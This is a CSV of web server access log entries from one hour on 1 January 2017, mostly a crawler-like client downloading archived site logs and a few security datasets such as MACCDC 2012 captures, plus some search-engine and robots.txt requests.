Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,46.229.168.69,-,01/Jan/2017:11:11:00 -0800,GET /self.logs/error.log.2016-08-31.gz HTTP/1.1,200,796
WSC,46.229.168.70,-,01/Jan/2017:11:11:15 -0800,GET /self.logs/access.log.2016-09-10.gz HTTP/1.1,200,5328
WSC,46.229.168.67,-,01/Jan/2017:11:11:39 -0800,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1,200,981
WSC,46.229.168.74,-,01/Jan/2017:11:11:53 -0800,GET /self.logs/error.log.2016-09-29.gz HTTP/1.1,200,550
WSC,46.229.168.65,-,01/Jan/2017:11:12:10 -0800,GET /self.logs/error.log.2016-10-20.gz HTTP/1.1,200,660
WSC,46.229.168.72,-,01/Jan/2017:11:12:28 -0800,GET /self.logs/access.log.2016-06-23.gz HTTP/1.1,200,7032
WSC,46.229.168.73,-,01/Jan/2017:11:12:49 -0800,GET /self.logs/access.log.2016-10-15.gz HTTP/1.1,200,6915
WSC,46.229.168.65,-,01/Jan/2017:11:13:06 -0800,GET /self.logs/error.log.2016-09-02.gz HTTP/1.1,200,735
WSC,46.229.168.68,-,01/Jan/2017:11:13:24 -0800,GET /self.logs/access.log.2016-04-19.gz HTTP/1.1,200,23663
WSC,46.229.168.65,-,01/Jan/2017:11:13:42 -0800,GET /self.logs/error.log.2016-05-28.gz HTTP/1.1,200,589
WSC,46.229.168.71,-,01/Jan/2017:11:14:02 -0800,GET /self.logs/access.log.2015-03-12.gz HTTP/1.1,200,9523
WSC,46.229.168.67,-,01/Jan/2017:11:14:16 -0800,GET /self.logs/error.log.2015-01-21.gz HTTP/1.1,200,579
WSC,46.229.168.72,-,01/Jan/2017:11:14:36 -0800,GET /self.logs/access.log.2015-06-12.gz HTTP/1.1,200,6190
WSC,46.229.168.68,-,01/Jan/2017:11:14:54 -0800,GET /self.logs/error.log.2016-02-12.gz HTTP/1.1,200,814
WSC,46.229.168.74,-,01/Jan/2017:11:15:09 -0800,GET /self.logs/error.log.2015-02-13.gz HTTP/1.1,200,5419
WSC,46.229.168.66,-,01/Jan/2017:11:15:32 -0800,GET /self.logs/access.log.2015-04-24.gz HTTP/1.1,200,3685
WSC,46.229.168.71,-,01/Jan/2017:11:15:53 -0800,GET /self.logs/error.log.2015-04-25.gz HTTP/1.1,200,956
WSC,46.229.168.71,-,01/Jan/2017:11:16:03 -0800,GET /self.logs/error.log.2016-05-26.gz HTTP/1.1,200,771
WSC,123.125.67.224,-,01/Jan/2017:11:16:15 -0800,GET / HTTP/1.1,200,10230
WSC,123.125.71.76,-,01/Jan/2017:11:16:16 -0800,GET / HTTP/1.1,200,10230
WSC,46.229.168.71,-,01/Jan/2017:11:16:25 -0800,GET /self.logs/error.log.2015-06-30.gz HTTP/1.1,200,756
WSC,46.229.168.74,-,01/Jan/2017:11:16:45 -0800,GET /self.logs/error.log.2015-04-11.gz HTTP/1.1,200,1758
WSC,46.229.168.67,-,01/Jan/2017:11:16:58 -0800,GET /self.logs/access.log.2015-11-12.gz HTTP/1.1,200,6074
WSC,46.229.168.73,-,01/Jan/2017:11:17:19 -0800,GET /self.logs/access.log.2016-04-15.gz HTTP/1.1,200,11780
WSC,46.229.168.68,-,01/Jan/2017:11:17:34 -0800,GET /self.logs/access.log.2016-01-09.gz HTTP/1.1,200,13008
WSC,46.229.168.70,-,01/Jan/2017:11:17:55 -0800,GET /self.logs/access.log.2016-05-09.gz HTTP/1.1,200,8385
WSC,46.229.168.66,-,01/Jan/2017:11:18:10 -0800,GET /self.logs/access.log.2015-11-30.gz HTTP/1.1,200,5189
WSC,46.229.168.66,-,01/Jan/2017:11:18:31 -0800,GET /self.logs/error.log.2015-06-18.gz HTTP/1.1,200,670
WSC,46.229.168.74,-,01/Jan/2017:11:18:49 -0800,GET /self.logs/error.log.2015-10-16.gz HTTP/1.1,200,774
WSC,46.229.168.74,-,01/Jan/2017:11:19:04 -0800,GET /self.logs/error.log.2015-12-14.gz HTTP/1.1,200,643
WSC,46.229.168.68,-,01/Jan/2017:11:19:24 -0800,GET /self.logs/access.log.2016-06-02.gz HTTP/1.1,200,11263
WSC,46.229.168.74,-,01/Jan/2017:11:19:42 -0800,GET /self.logs/error.log.2016-05-12.gz HTTP/1.1,200,992
WSC,58.16.42.148,-,01/Jan/2017:11:19:50 -0800,HEAD /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,226
WSC,46.229.168.65,-,01/Jan/2017:11:20:02 -0800,GET /self.logs/error.log.2016-03-04.gz HTTP/1.1,200,943
WSC,46.229.168.68,-,01/Jan/2017:11:20:25 -0800,GET /self.logs/error.log.2016-05-04.gz HTTP/1.1,200,744
WSC,46.229.168.70,-,01/Jan/2017:11:20:37 -0800,GET /self.logs/error.log.2015-01-23.gz HTTP/1.1,200,610
WSC,46.229.168.70,-,01/Jan/2017:11:21:04 -0800,GET /self.logs/error.log.2015-11-21.gz HTTP/1.1,200,1001
WSC,46.229.168.69,-,01/Jan/2017:11:21:12 -0800,GET /self.logs/error.log.2016-02-04.gz HTTP/1.1,200,871
WSC,46.229.168.73,-,01/Jan/2017:11:21:30 -0800,GET /self.logs/error.log.2015-10-22.gz HTTP/1.1,200,958
WSC,46.229.168.73,-,01/Jan/2017:11:21:49 -0800,GET /self.logs/error.log.2016-01-23.gz HTTP/1.1,200,847
WSC,46.229.168.72,-,01/Jan/2017:11:22:06 -0800,GET /maccdc2012/dns.log.gz HTTP/1.1,200,305376
WSC,46.229.168.67,-,01/Jan/2017:11:22:22 -0800,GET /self.logs/error.log.2015-07-04.gz HTTP/1.1,200,827
WSC,46.229.168.66,-,01/Jan/2017:11:22:43 -0800,GET /self.logs/error.log.2015-03-17.gz HTTP/1.1,200,794
WSC,46.229.168.68,-,01/Jan/2017:11:22:59 -0800,GET /self.logs/error.log.2015-08-26.gz HTTP/1.1,200,646
WSC,46.229.168.65,-,01/Jan/2017:11:23:20 -0800,GET /self.logs/error.log.2016-02-08.gz HTTP/1.1,200,676
WSC,46.229.168.71,-,01/Jan/2017:11:23:36 -0800,GET /self.logs/access.log.2016-04-16.gz HTTP/1.1,200,9797
WSC,46.229.168.72,-,01/Jan/2017:11:23:59 -0800,GET /self.logs/error.log.2015-07-19.gz HTTP/1.1,200,1059
WSC,46.229.168.67,-,01/Jan/2017:11:24:14 -0800,GET /self.logs/error.log.2015-10-15.gz HTTP/1.1,200,1075
WSC,46.229.168.67,-,01/Jan/2017:11:24:37 -0800,GET /self.logs/error.log.2015-10-28.gz HTTP/1.1,200,802
WSC,46.229.168.66,-,01/Jan/2017:11:24:50 -0800,GET /self.logs/access.log.2015-04-17.gz HTTP/1.1,200,6180
WSC,46.229.168.68,-,01/Jan/2017:11:25:08 -0800,GET /self.logs/error.log.2016-03-10.gz HTTP/1.1,200,823
WSC,46.229.168.66,-,01/Jan/2017:11:25:24 -0800,GET /self.logs/error.log.2015-03-27.gz HTTP/1.1,200,890
WSC,46.229.168.65,-,01/Jan/2017:11:25:41 -0800,GET /self.logs/error.log.2015-12-05.gz HTTP/1.1,200,757
WSC,46.229.168.71,-,01/Jan/2017:11:26:03 -0800,GET /self.logs/access.log.2015-05-17.gz HTTP/1.1,200,4073
WSC,46.229.168.73,-,01/Jan/2017:11:26:18 -0800,GET /self.logs/error.log.2015-08-11.gz HTTP/1.1,200,798
WSC,46.229.168.74,-,01/Jan/2017:11:26:37 -0800,GET /self.logs/access.log.2015-07-21.gz HTTP/1.1,200,5874
WSC,46.229.168.71,-,01/Jan/2017:11:26:56 -0800,GET /self.logs/error.log.2015-12-01.gz HTTP/1.1,200,728
WSC,46.229.168.74,-,01/Jan/2017:11:27:14 -0800,GET /self.logs/error.log.2015-11-30.gz HTTP/1.1,200,853
WSC,46.229.168.71,-,01/Jan/2017:11:27:32 -0800,GET /self.logs/error.log.2015-01-29.gz HTTP/1.1,200,1460
WSC,46.229.168.67,-,01/Jan/2017:11:27:50 -0800,GET /self.logs/error.log.2016-04-24.gz HTTP/1.1,200,616
WSC,46.229.168.67,-,01/Jan/2017:11:28:09 -0800,GET /self.logs/access.log.2015-08-06.gz HTTP/1.1,200,6129
WSC,66.249.93.64,-,01/Jan/2017:11:28:23 -0800,GET / HTTP/1.1,200,10267
WSC,66.249.93.95,-,01/Jan/2017:11:28:23 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,46.229.168.69,-,01/Jan/2017:11:28:35 -0800,GET /self.logs/error.log.2015-09-24.gz HTTP/1.1,200,696
WSC,46.229.168.73,-,01/Jan/2017:11:28:45 -0800,GET /self.logs/access.log.2015-03-11.gz HTTP/1.1,200,2423
WSC,46.229.168.68,-,01/Jan/2017:11:29:00 -0800,GET /self.logs/error.log.2016-01-17.gz HTTP/1.1,200,693
WSC,46.229.168.72,-,01/Jan/2017:11:29:18 -0800,GET /self.logs/access.log.2015-12-19.gz HTTP/1.1,200,6389
WSC,46.229.168.68,-,01/Jan/2017:11:29:35 -0800,GET /self.logs/error.log.2016-04-25.gz HTTP/1.1,200,1220
WSC,46.229.168.69,-,01/Jan/2017:11:29:55 -0800,GET /self.logs/access.log.2016-05-10.gz HTTP/1.1,200,11253
WSC,46.229.168.65,-,01/Jan/2017:11:30:13 -0800,GET /self.logs/access.log.2015-10-08.gz HTTP/1.1,200,3870
WSC,46.229.168.72,-,01/Jan/2017:11:30:30 -0800,GET /self.logs/error.log.2015-08-07.gz HTTP/1.1,200,1058
WSC,46.229.168.65,-,01/Jan/2017:11:30:54 -0800,GET /self.logs/error.log.2015-04-21.gz HTTP/1.1,200,2166
WSC,46.229.168.71,-,01/Jan/2017:11:31:08 -0800,GET /self.logs/access.log.2015-07-17.gz HTTP/1.1,200,4609
WSC,46.229.168.67,-,01/Jan/2017:11:31:28 -0800,GET /self.logs/access.log.2015-12-09.gz HTTP/1.1,200,7689
WSC,46.229.168.73,-,01/Jan/2017:11:31:43 -0800,GET /squid/access.log.gz HTTP/1.1,200,295241
WSC,46.229.168.73,-,01/Jan/2017:11:32:05 -0800,GET /self.logs/access.log.2015-10-18.gz HTTP/1.1,200,4376
WSC,46.229.168.70,-,01/Jan/2017:11:32:23 -0800,GET /self.logs/error.log.2015-11-13.gz HTTP/1.1,200,567
WSC,46.229.168.73,-,01/Jan/2017:11:32:42 -0800,GET /self.logs/error.log.2015-05-09.gz HTTP/1.1,200,741
WSC,46.229.168.69,-,01/Jan/2017:11:32:59 -0800,GET /self.logs/error.log.2016-05-05.gz HTTP/1.1,200,690
WSC,46.229.168.69,-,01/Jan/2017:11:33:14 -0800,GET /self.logs/access.log.2015-02-13.gz HTTP/1.1,200,15573
WSC,46.229.168.71,-,01/Jan/2017:11:33:36 -0800,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1,200,607
WSC,46.229.168.65,-,01/Jan/2017:11:33:53 -0800,GET /self.logs/access.log.2015-12-03.gz HTTP/1.1,200,5151
WSC,46.229.168.70,-,01/Jan/2017:11:34:13 -0800,GET /self.logs/error.log.2015-06-04.gz HTTP/1.1,200,931
WSC,46.229.168.69,-,01/Jan/2017:11:34:30 -0800,GET /self.logs/access.log.2015-04-21.gz HTTP/1.1,200,6686
WSC,46.229.168.73,-,01/Jan/2017:11:34:45 -0800,GET /self.logs/access.log.2016-01-25.gz HTTP/1.1,200,6640
WSC,46.229.168.65,-,01/Jan/2017:11:35:03 -0800,GET /self.logs/error.log.2015-01-27.gz HTTP/1.1,200,635
WSC,46.229.168.71,-,01/Jan/2017:11:35:20 -0800,GET /self.logs/access.log.2016-04-17.gz HTTP/1.1,200,8951
WSC,46.229.168.74,-,01/Jan/2017:11:35:37 -0800,GET /self.logs/error.log.2015-11-17.gz HTTP/1.1,200,565
WSC,46.229.168.66,-,01/Jan/2017:11:35:55 -0800,GET /self.logs/access.log.2016-02-09.gz HTTP/1.1,200,9365
WSC,46.229.168.68,-,01/Jan/2017:11:36:17 -0800,GET /self.logs/error.log.2016-01-06.gz HTTP/1.1,200,689
WSC,46.229.168.69,-,01/Jan/2017:11:36:37 -0800,GET /self.logs/access.log.2016-02-20.gz HTTP/1.1,200,10101
WSC,46.229.168.70,-,01/Jan/2017:11:36:52 -0800,GET /self.logs/error.log.2015-12-02.gz HTTP/1.1,200,621
WSC,46.229.168.71,-,01/Jan/2017:11:37:10 -0800,GET /self.logs/access.log.2015-01-26.gz HTTP/1.1,200,3220
WSC,46.229.168.66,-,01/Jan/2017:11:37:26 -0800,GET /self.logs/access.log.2015-09-02.gz HTTP/1.1,200,3890
WSC,46.229.168.74,-,01/Jan/2017:11:37:49 -0800,GET /self.logs/access.log.2015-08-07.gz HTTP/1.1,200,4598
WSC,46.229.168.72,-,01/Jan/2017:11:38:02 -0800,GET /self.logs/access.log.2015-02-07.gz HTTP/1.1,200,2783
WSC,46.229.168.70,-,01/Jan/2017:11:38:25 -0800,GET /self.logs/error.log.2015-08-19.gz HTTP/1.1,200,766
WSC,46.229.168.74,-,01/Jan/2017:11:38:43 -0800,GET /self.logs/access.log.2015-08-08.gz HTTP/1.1,200,2816
WSC,46.229.168.66,-,01/Jan/2017:11:39:03 -0800,GET /self.logs/access.log.2015-04-26.gz HTTP/1.1,200,3853
WSC,46.229.168.70,-,01/Jan/2017:11:39:30 -0800,GET /self.logs/error.log.2016-03-14.gz HTTP/1.1,200,902
WSC,46.229.168.72,-,01/Jan/2017:11:39:39 -0800,GET /self.logs/access.log.2015-02-05.gz HTTP/1.1,200,3517
WSC,46.229.168.67,-,01/Jan/2017:11:40:00 -0800,GET /self.logs/error.log.2015-11-19.gz HTTP/1.1,200,1657
WSC,46.229.168.65,-,01/Jan/2017:11:40:27 -0800,GET /self.logs/error.log.2015-01-19.gz HTTP/1.1,200,1139
WSC,46.229.168.67,-,01/Jan/2017:11:40:40 -0800,GET /self.logs/access.log.2015-04-14.gz HTTP/1.1,200,5028
WSC,46.229.168.74,-,01/Jan/2017:11:41:12 -0800,GET /self.logs/error.log.2016-05-18.gz HTTP/1.1,200,664
WSC,46.229.168.69,-,01/Jan/2017:11:41:18 -0800,GET /self.logs/access.log.2015-09-24.gz HTTP/1.1,200,4767
WSC,46.229.168.74,-,01/Jan/2017:11:41:39 -0800,GET /self.logs/access.log.2016-05-23.gz HTTP/1.1,200,15193
WSC,46.229.168.71,-,01/Jan/2017:11:42:03 -0800,GET /self.logs/access.log.2015-12-26.gz HTTP/1.1,200,3786
WSC,46.229.168.67,-,01/Jan/2017:11:42:14 -0800,GET /self.logs/error.log.2016-04-17.gz HTTP/1.1,200,825
WSC,46.229.168.68,-,01/Jan/2017:11:42:36 -0800,GET /self.logs/error.log.2015-08-16.gz HTTP/1.1,200,2656
WSC,46.229.168.71,-,01/Jan/2017:11:43:06 -0800,GET /self.logs/access.log.2016-06-11.gz HTTP/1.1,200,7697
WSC,46.229.168.65,-,01/Jan/2017:11:43:25 -0800,GET /self.logs/error.log.2016-06-11.gz HTTP/1.1,200,816
WSC,46.229.168.73,-,01/Jan/2017:11:43:34 -0800,GET /self.logs/access.log.2015-08-27.gz HTTP/1.1,200,6066
WSC,65.55.210.255,-,01/Jan/2017:11:43:06 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,16758642
WSC,46.229.168.70,-,01/Jan/2017:11:44:10 -0800,GET /self.logs/access.log.2015-05-29.gz HTTP/1.1,200,3713
WSC,46.229.168.65,-,01/Jan/2017:11:44:11 -0800,GET /self.logs/error.log.2015-04-04.gz HTTP/1.1,200,2224
WSC,46.229.168.65,-,01/Jan/2017:11:44:11 -0800,GET /self.logs/error.log.2015-04-04.gz HTTP/1.1,200,2224
WSC,46.229.168.73,-,01/Jan/2017:11:44:30 -0800,GET /self.logs/access.log.2016-01-01.gz HTTP/1.1,200,5468
WSC,46.229.168.68,-,01/Jan/2017:11:44:57 -0800,GET /self.logs/access.log.2015-03-20.gz HTTP/1.1,200,4178
WSC,46.229.168.73,-,01/Jan/2017:11:45:06 -0800,GET /self.logs/error.log.2015-02-27.gz HTTP/1.1,200,825
WSC,46.229.168.68,-,01/Jan/2017:11:45:28 -0800,GET /self.logs/?C=S%3BO%3DA HTTP/1.1,200,14663
WSC,46.229.168.68,-,01/Jan/2017:11:45:54 -0800,GET /self.logs/?C=S%3BO%3DA HTTP/1.1,200,14663
WSC,46.229.168.71,-,01/Jan/2017:11:46:02 -0800,GET /self.logs/error.log.2015-07-23.gz HTTP/1.1,200,1053
WSC,46.229.168.73,-,01/Jan/2017:11:46:07 -0800,GET /self.logs/error.log.2015-07-13.gz HTTP/1.1,200,802
WSC,46.229.168.69,-,01/Jan/2017:11:46:31 -0800,GET /self.logs/error.log.2016-03-29.gz HTTP/1.1,200,705
WSC,46.229.168.69,-,01/Jan/2017:11:46:46 -0800,GET /self.logs/access.log.2015-12-02.gz HTTP/1.1,200,5957
WSC,46.229.168.68,-,01/Jan/2017:11:47:06 -0800,GET /self.logs/access.log.2016-04-09.gz HTTP/1.1,200,11424
WSC,46.229.168.74,-,01/Jan/2017:11:47:20 -0800,GET /self.logs/error.log.2016-06-01.gz HTTP/1.1,200,1622
WSC,46.229.168.71,-,01/Jan/2017:11:47:56 -0800,GET /self.logs/access.log.2015-08-22.gz HTTP/1.1,200,4457
WSC,46.229.168.65,-,01/Jan/2017:11:48:04 -0800,GET /self.logs/access.log.2015-05-01.gz HTTP/1.1,200,4450
WSC,69.30.210.242,-,01/Jan/2017:11:48:04 -0800,GET /robots.txt HTTP/1.1,200,289
WSC,69.30.210.242,-,01/Jan/2017:11:48:09 -0800,GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1,404,239
WSC,46.229.168.73,-,01/Jan/2017:11:48:18 -0800,GET /self.logs/access.log.2015-02-27.gz HTTP/1.1,200,3186
WSC,46.229.168.71,-,01/Jan/2017:11:48:45 -0800,GET /self.logs/error.log.2015-06-15.gz HTTP/1.1,200,1292
WSC,46.229.168.71,-,01/Jan/2017:11:48:53 -0800,GET /self.logs/access.log.2015-06-13.gz HTTP/1.1,200,3578
WSC,46.229.168.72,-,01/Jan/2017:11:49:11 -0800,GET /self.logs/error.log.2016-02-09.gz HTTP/1.1,200,640
WSC,46.229.168.74,-,01/Jan/2017:11:49:36 -0800,GET /self.logs/error.log.2015-08-15.gz HTTP/1.1,200,650
WSC,46.229.168.74,-,01/Jan/2017:11:49:50 -0800,GET /self.logs/access.log.2015-05-09.gz HTTP/1.1,200,2819
WSC,46.229.168.68,-,01/Jan/2017:11:50:11 -0800,GET /self.logs/access.log.2016-03-28.gz HTTP/1.1,200,12351
WSC,46.229.168.74,-,01/Jan/2017:11:50:24 -0800,GET /self.logs/access.log.2015-06-03.gz HTTP/1.1,200,3363
WSC,46.229.168.69,-,01/Jan/2017:11:50:51 -0800,GET /self.logs/access.log.2016-03-22.gz HTTP/1.1,200,8257
WSC,46.229.168.70,-,01/Jan/2017:11:51:05 -0800,GET /self.logs/access.log.2015-03-22.gz HTTP/1.1,200,3642
WSC,46.229.168.71,-,01/Jan/2017:11:51:17 -0800,GET /self.logs/error.log.2015-02-28.gz HTTP/1.1,200,939
WSC,46.229.168.74,-,01/Jan/2017:11:51:41 -0800,GET /self.logs/error.log.2016-01-30.gz HTTP/1.1,200,671
WSC,46.229.168.69,-,01/Jan/2017:11:51:59 -0800,GET /self.logs/access.log.2016-04-03.gz HTTP/1.1,200,14138
WSC,46.229.168.72,-,01/Jan/2017:11:52:14 -0800,GET /self.logs/error.log.2016-02-13.gz HTTP/1.1,200,812
WSC,46.229.168.72,-,01/Jan/2017:11:52:35 -0800,GET /self.logs/access.log.2015-10-02.gz HTTP/1.1,200,3773
WSC,46.229.168.72,-,01/Jan/2017:11:53:01 -0800,GET /self.logs/error.log.2016-04-04.gz HTTP/1.1,200,617
WSC,46.229.168.67,-,01/Jan/2017:11:53:09 -0800,GET /self.logs/error.log.2015-10-24.gz HTTP/1.1,200,830
WSC,46.229.168.70,-,01/Jan/2017:11:53:26 -0800,GET /self.logs/access.log.2015-08-09.gz HTTP/1.1,200,4540
WSC,46.229.168.72,-,01/Jan/2017:11:53:46 -0800,GET /self.logs/error.log.2016-02-07.gz HTTP/1.1,200,695
WSC,46.229.168.66,-,01/Jan/2017:11:54:06 -0800,GET /self.logs/error.log.2015-09-25.gz HTTP/1.1,200,761
WSC,46.229.168.72,-,01/Jan/2017:11:54:23 -0800,GET /self.logs/error.log.2015-07-02.gz HTTP/1.1,200,803
WSC,46.229.168.67,-,01/Jan/2017:11:54:40 -0800,GET /self.logs/error.log.2015-03-25.gz HTTP/1.1,200,928
WSC,46.229.168.72,-,01/Jan/2017:11:55:00 -0800,GET /self.logs/access.log.2015-05-13.gz HTTP/1.1,200,7807
WSC,46.229.168.70,-,01/Jan/2017:11:55:16 -0800,GET /self.logs/access.log.2016-01-30.gz HTTP/1.1,200,34273
WSC,46.229.168.65,-,01/Jan/2017:11:55:44 -0800,GET /self.logs/access.log.2015-06-24.gz HTTP/1.1,200,4057
WSC,46.229.168.66,-,01/Jan/2017:11:55:57 -0800,GET /self.logs/access.log.2016-03-29.gz HTTP/1.1,200,8883
WSC,46.229.168.73,-,01/Jan/2017:11:56:09 -0800,GET /self.logs/error.log.2016-01-26.gz HTTP/1.1,200,714
WSC,46.229.168.66,-,01/Jan/2017:11:56:39 -0800,GET /self.logs/access.log.2016-01-15.gz HTTP/1.1,200,7490
WSC,46.229.168.69,-,01/Jan/2017:11:56:50 -0800,GET /self.logs/access.log.2015-02-23.gz HTTP/1.1,200,10578
WSC,46.229.168.69,-,01/Jan/2017:11:57:12 -0800,GET /self.logs/error.log.2015-06-05.gz HTTP/1.1,200,637
WSC,46.229.168.72,-,01/Jan/2017:11:57:29 -0800,GET /self.logs/error.log.2016-02-20.gz HTTP/1.1,200,528
WSC,46.229.168.65,-,01/Jan/2017:11:57:53 -0800,GET /self.logs/error.log.2015-06-14.gz HTTP/1.1,200,886
WSC,46.229.168.74,-,01/Jan/2017:11:58:04 -0800,GET /self.logs/access.log.2015-01-30.gz HTTP/1.1,200,6235
WSC,46.229.168.68,-,01/Jan/2017:11:58:25 -0800,GET /self.logs/access.log.2015-01-19.gz HTTP/1.1,200,2799
WSC,46.229.168.73,-,01/Jan/2017:11:58:41 -0800,GET /self.logs/access.log.2015-03-23.gz HTTP/1.1,200,4096
WSC,46.229.168.67,-,01/Jan/2017:11:58:57 -0800,GET /self.logs/access.log.2015-06-25.gz HTTP/1.1,200,3792
WSC,46.229.168.71,-,01/Jan/2017:11:59:18 -0800,GET /self.logs/error.log.2015-08-22.gz HTTP/1.1,200,664
WSC,46.229.168.69,-,01/Jan/2017:11:59:34 -0800,GET /self.logs/error.log.2015-11-04.gz HTTP/1.1,200,1046
WSC,46.229.168.65,-,01/Jan/2017:11:59:51 -0800,GET /self.logs/error.log.2015-05-14.gz HTTP/1.1,200,1026
WSC,46.229.168.68,-,01/Jan/2017:12:00:07 -0800,GET /self.logs/access.log.2016-06-13.gz HTTP/1.1,200,20921
WSC,46.229.168.69,-,01/Jan/2017:12:00:28 -0800,GET /self.logs/error.log.2015-03-29.gz HTTP/1.1,200,801
WSC,46.229.168.73,-,01/Jan/2017:12:00:49 -0800,GET /self.logs/access.log.2016-03-07.gz HTTP/1.1,200,9442
WSC,46.229.168.65,-,01/Jan/2017:12:01:03 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,296701
WSC,46.229.168.65,-,01/Jan/2017:12:01:22 -0800,GET /self.logs/error.log.2015-07-14.gz HTTP/1.1,200,615
WSC,46.229.168.70,-,01/Jan/2017:12:01:44 -0800,GET /self.logs/access.log.2015-08-04.gz HTTP/1.1,200,5744
WSC,46.229.168.72,-,01/Jan/2017:12:02:03 -0800,GET /self.logs/error.log.2015-06-16.gz HTTP/1.1,200,710
WSC,46.229.168.69,-,01/Jan/2017:12:02:20 -0800,GET /self.logs/error.log.2015-01-31.gz HTTP/1.1,200,732
WSC,46.229.168.68,-,01/Jan/2017:12:02:38 -0800,GET /self.logs/access.log.2016-04-14.gz HTTP/1.1,200,9233
WSC,46.229.168.69,-,01/Jan/2017:12:03:01 -0800,GET /self.logs/error.log.2015-05-17.gz HTTP/1.1,200,749
WSC,46.229.168.65,-,01/Jan/2017:12:03:19 -0800,GET /self.logs/access.log.2015-05-19.gz HTTP/1.1,200,4744
WSC,46.229.168.65,-,01/Jan/2017:12:03:35 -0800,GET /self.logs/error.log.2016-06-14.gz HTTP/1.1,200,1198
WSC,46.229.168.65,-,01/Jan/2017:12:03:52 -0800,GET /self.logs/access.log.2015-01-18.gz HTTP/1.1,200,3435
WSC,46.229.168.74,-,01/Jan/2017:12:04:13 -0800,GET /self.logs/error.log.2015-02-10.gz HTTP/1.1,200,4865
WSC,46.229.168.67,-,01/Jan/2017:12:04:31 -0800,GET /self.logs/access.log.2016-01-13.gz HTTP/1.1,200,6515
WSC,46.229.168.73,-,01/Jan/2017:12:04:48 -0800,GET /self.logs/access.log.2015-07-18.gz HTTP/1.1,200,5186
WSC,46.229.168.68,-,01/Jan/2017:12:05:08 -0800,GET /self.logs/error.log.2015-12-03.gz HTTP/1.1,200,682
WSC,46.229.168.65,-,01/Jan/2017:12:05:25 -0800,GET /self.logs/error.log.2015-02-19.gz HTTP/1.1,200,5365
WSC,54.172.242.152,-,01/Jan/2017:12:05:28 -0800,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,200,25834
WSC,46.229.168.66,-,01/Jan/2017:12:05:41 -0800,GET /self.logs/access.log.2015-08-25.gz HTTP/1.1,200,6475
